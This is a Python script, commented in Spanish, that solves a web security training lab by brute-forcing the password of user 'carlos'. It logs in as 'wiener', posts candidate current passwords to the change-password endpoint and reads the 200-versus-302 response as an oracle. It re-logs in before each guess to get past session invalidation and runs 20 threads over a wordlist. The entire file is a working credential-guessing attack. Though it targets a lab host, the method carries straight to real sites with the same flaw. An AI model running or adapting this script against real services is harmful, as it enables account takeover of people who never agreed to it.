#!/usr/bin/env python3
"""
Brute-force del password de carlos en el lab "Password brute-force via password change".

Oraculo:
  POST /my-account/change-password con username=carlos, new-password-1!=new-password-2
    - current-password CORRECTO  -> 200 "New passwords do not match"
    - current-password INCORRECTO -> 302 Location: /login (sesion invalidada)

Como el server invalida la sesion en cada fallo, antes de cada intento volvemos a
loguearnos como wiener para tener una sesion fresca. 2 requests por candidato.

Uso:
    python3 bruteforce.py --host <lab-host> [--workers 20] [--wordlist passwords.txt]

Ejemplo:
    python3 bruteforce.py \\
        --host 0ac2006e0496cc308009266f0076001d.web-security-academy.net
"""

import argparse
import concurrent.futures
import sys
import threading
from pathlib import Path

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

FOUND = threading.Event()
RESULT = {}


def make_session(retries: int = 2) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.2,
                  status_forcelist=[500, 502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_connections=50,
                                    pool_maxsize=50))
    return s


def login_wiener(host: str, attacker_user: str, attacker_pwd: str) -> str | None:
    """Login con wiener:peter, devuelve la cookie session post-login."""
    s = make_session()
    r = s.post(f"https://{host}/login",
               data={"username": attacker_user, "password": attacker_pwd},
               allow_redirects=False, timeout=15)
    if r.status_code != 302:
        return None
    return r.cookies.get("session")


def try_password(host: str, target_user: str, attacker_user: str,
                 attacker_pwd: str, candidate: str) -> tuple[str, int, bool]:
    """
    Devuelve (candidate, status, hit).
    hit=True si el response indica current-password correcto.
    """
    if FOUND.is_set():
        return candidate, -1, False

    session_cookie = login_wiener(host, attacker_user, attacker_pwd)
    if not session_cookie:
        return candidate, -2, False

    s = make_session()
    try:
        r = s.post(f"https://{host}/my-account/change-password",
                   cookies={"session": session_cookie},
                   data={
                       "username": target_user,
                       "current-password": candidate,
                       "new-password-1": "A",
                       "new-password-2": "B",
                   },
                   allow_redirects=False, timeout=15)
    except requests.RequestException:
        return candidate, -3, False

    # Oraculo: 302 a /login = wrong; 200 con "New passwords do not match" = right
    hit = (r.status_code == 200
           and b"New passwords do not match" in r.content)
    if hit:
        RESULT.update({
            "password": candidate,
            "status": r.status_code,
            "length": len(r.content),
        })
        FOUND.set()
    return candidate, r.status_code, hit


def main():
    p = argparse.ArgumentParser(description="Password brute-force via change-password")
    p.add_argument("--host", required=True, help="Lab host")
    p.add_argument("--target", default="carlos", help="Username objetivo (default carlos)")
    p.add_argument("--attacker-user", default="wiener",
                   help="Username propio (default wiener)")
    p.add_argument("--attacker-pwd", default="peter",
                   help="Password propio (default peter)")
    p.add_argument("--workers", type=int, default=20)
    p.add_argument("--wordlist", default="passwords.txt",
                   help="Path al wordlist (default passwords.txt)")
    args = p.parse_args()

    wordlist_path = Path(args.wordlist)
    if not wordlist_path.exists():
        print(f"[!] Wordlist no encontrado: {wordlist_path}")
        sys.exit(2)

    candidates = [line.strip() for line in wordlist_path.read_text().splitlines()
                  if line.strip()]

    print(f"[*] Target: {args.host}")
    print(f"[*] Atacando: {args.target} (con sesion de {args.attacker_user})")
    print(f"[*] Wordlist: {len(candidates)} candidatos, {args.workers} workers")

    tried = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {ex.submit(try_password, args.host, args.target,
                              args.attacker_user, args.attacker_pwd, c): c
                   for c in candidates}
        try:
            for fut in concurrent.futures.as_completed(futures):
                cand, status, hit = fut.result()
                tried += 1
                if hit:
                    print(f"\n[+] PASSWORD ENCONTRADO: {cand}")
                    print(f"    Status: {status}")
                    break
                if tried % 25 == 0:
                    print(f"    {tried}/{len(candidates)} probados, "
                          f"ultimo: {cand!r} status {status}")
        except KeyboardInterrupt:
            print("\n[!] Interrumpido")
            FOUND.set()

    if RESULT:
        print("\n=== Lab solved ===")
        print(f"  {args.target}:{RESULT['password']}")
        print(f"\nLogin con esas credenciales para acceder al panel de {args.target}.")
        sys.exit(0)
    else:
        print("\n[!] No se encontro el password en el wordlist.")
        sys.exit(1)


if __name__ == "__main__":
    main()
